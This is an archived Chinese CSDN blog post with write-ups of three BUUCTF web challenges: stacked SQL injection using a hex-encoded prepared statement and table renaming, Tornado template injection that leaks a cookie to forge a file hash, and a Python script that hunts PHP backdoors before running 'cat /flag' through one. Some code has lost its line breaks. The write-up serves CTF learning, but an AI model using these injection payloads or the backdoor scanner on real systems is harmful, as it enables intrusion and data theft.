<!--yml
category: 未分类
date: 2022-04-26 14:44:42
-->

# 【web】BUUCTF-web刷题记录_weixin_30684743的博客-CSDN博客

> 来源：[https://blog.csdn.net/weixin_30684743/article/details/101336977](https://blog.csdn.net/weixin_30684743/article/details/101336977)

本来一题一篇文章，结果发现太浪费了，所以整合起来了，这篇博文就记录 BUUCTF 的  web 题目的题解吧！

# 随便注

随便输入一个单引号，报错

![](img/970f79b1eff051aec8d6b769ebe7843d.png)

order by 3就不行了

![](img/1ba17dde9f3e44f6be0ab9d56bff1126.png)

尝试联合查询的时候出现提示：

```
"/select|update|delete|drop|insert|where|\./i"
```

![](img/9853aa89ee2b5247629622ce9034e208.png)

一个正则可视化网站：https://regexper.com

![](img/385085ba1a87b1b4e72419b8b7e24bff.png)

 使用堆叠注入：1';show tables;#

![](img/0a0a31bc288c6b191458a145d4dd9fe8.png)

看一下表里有什么列名：1';show columns from `1919810931114514`;#

（注意，字符串为表名的表操作时要加反引号）

![](img/5d557f1baf02cf6e801f39ec2cf094d7.png)

但是没办法使用 select * from `1919810931114514`

看网上师傅们有两种方法，第一种：**mysql 预定义语句**

```
1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;Prepare execsql from @a;execute execsql;#

hex decode 以后是：?inject=1';SeT@a=select * from `1919810931114514`;Prepare execsql from @a;execute execsql;#
```

 ![](img/6a8698ae71a07f42062cb101d314abfc.png)

还有一种方法时是：**改表名 **这样查询的时候就可以查询到 flag

```
?inject=1';
rename tables `words` to `test`;rename tables `1919810931114514` to `words`;
alter table `words` change `flag` `id` varchar(100);#
```

意思分别是：把 words 表改名为 test，把 1919810931114541 改名为 words

把列名 flag 改为 id

这样在 1'; or 1=1# 查询的时候就会把所有的都列出来，这样就可以看到 flag 了

![](img/fb97ae9ec12e701615fccafb0e5213c8.png)

# easy_tornado

打开看到有三个文件：

![](img/513aa2c8d94059b555809da1d2dbf095.png)

三个文件内容如下：

![](img/287b34c56b523361dafdf8f0b2c3c90f.png)

![](img/b503bc128e439e89aaf224f2c9803f84.png)

![](img/99c5575e6f2b72c8d6a62ad38fdbc12b.png)

通过 url 知道，访问一个文件需要知道：filename 跟 filehash

![](img/2368b1990853a38e09a29aa4186f0b40.png)

企图直接访问是不行的，想到了 burp 抓包，但是抓了半天没抓到，看了网上的 wp 是 **模版注入**

![](img/3c6c2a425ccb239b11a6293452329c18.png)

tornado 是一个 python 的模板，welcome.txt 中的 render 是 python 中的一个渲染函数，

报错时候的 url 是这样的

![](img/0847e905fdf7ecb7c078cd492a3b24ac.png)

尝试把后面换成：{{111}}，输出了！

![](img/24ab1c0008f9c25b41f88ccbd29734e9.png)

在 tornado 模板中，存在一些可以访问的快速对象，例如：

```
 <title>
     {{ escape(handler.settings["cookie"]) }}
 </title>
```

那么输入：**{{handler.settings}}**

![](img/7863b572c9ae653230df638f2253dd47.png)

拿到 cookie 就 OK 了！

```
import hashlib
def md5value(s):
    md5 = hashlib.md5() 
    md5.update(s) 
    return md5.hexdigest()
def jiami(): 
    filename = '/fllllllllllllag' cookie_s ="ea7d75de-4ca5-486a-a69c-e690f3a8c217" print(md5value(filename.encode('utf-8'))) x=md5value(filename.encode('utf-8')) y=cookie_s+xprint(md5value(y.encode('utf-8'))) jiami()
```

![](img/7f6a1548116de9c12d2da90369d7b99e.png)

# 高明的黑客

访问提示源码在 www.tar.gz

![](img/5d4f7dbbb8162f1030d165407f509ac7.png)

在网址后面加上 www.tar.gz 是可以下载下来的

![](img/afe2742134e81157e97e974d8620ba84.png)

下下来里面超级多 php 文件，用大佬的 python 脚本筛选出来

```
import os,re
import requests
filenames = os.listdir('D:/anquan/localtest/PHPTutorial/WWW/CTFtraining/BUUCTF/src/')
pattern = re.compile(r"\$_[GEPOST]{3,4}\[.*\]")
for name in filenames:
    print(name) with open('D:/anquan/localtest/PHPTutorial/WWW/CTFtraining/BUUCTF/src/'+name,'r') as f: data = f.read() result = list(set(pattern.findall(data))) for ret in result: try: command = 'echo "got it"' flag = 'got it' # command = 'phpinfo();' # flag = 'phpinfo' if 'GET' in ret: passwd = re.findall(r"'(.*)'",ret)[0] r = requests.get(url='http://127.0.0.1/CTFtraining/BUUCTF/src/' + name + '?' + passwd + '='+ command) if "got it" in r.text: print('backdoor file is: ' + name) print('GET: ' + passwd) elif 'POST' in ret: passwd = re.findall(r"'(.*)'",ret)[0] r = requests.post(url='http://127.0.0.1/CTFtraining/BUUCTF/src/' + name,data={passwd:command}) if "got it" in r.text: print('backdoor file is: ' + name) print('POST: ' + passwd) except : pass
```

 我参考的网上的 wp 直接把 x 开头之前的 php 文件删掉了，不然要跑很长时间（php 版本要用 7 以上的）

![](img/c12827e46bc9b28b6ac5594e2c1ce5d0.png)

访问 xk0SzyKwfzw.php?Efa5BVG= cat /flag 得到 flag

![](img/73896e553f61451a115419846534e6d3.png)